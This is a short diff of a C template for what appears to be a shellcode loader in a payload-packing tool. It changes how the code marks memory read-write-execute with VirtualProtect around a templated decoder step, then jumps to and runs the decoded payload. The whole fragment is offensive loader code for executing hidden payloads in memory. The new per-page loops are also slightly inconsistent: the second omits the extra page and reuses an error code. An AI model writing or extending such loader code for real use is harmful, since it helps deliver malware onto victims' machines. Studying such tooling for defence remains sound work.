@@ -22,15 +22,19 @@ int main()
 
     // Note: RWX if carrier and payload are on the same page (or we cant exec copy..)
     //       can do only RW otherwise?
-	if (VirtualProtect(dest, {{PAYLOAD_LEN}}, p_RWX, &result) == 0) {
-		return 16;
-	}
+    for(int n=0; n<({{PAYLOAD_LEN}}/4096)+1; n++) {
+        if (VirtualProtect(dest + (n * 4096), 16, p_RWX, &result) == 0) {
+            return 16;
+        }
+    }
 
 {{ plugin_decoder }}
 
-	if (VirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
-		return 17;
-	}
+    for(int n=0; n<{{PAYLOAD_LEN}}/4096; n++) {
+        if (VirtualProtect(dest + (n * 4096), 16, p_RX, &result) == 0) {
+            return 16;
+        }
+    }
 
     // Execute *dest
     (*(void(*)())(dest))();
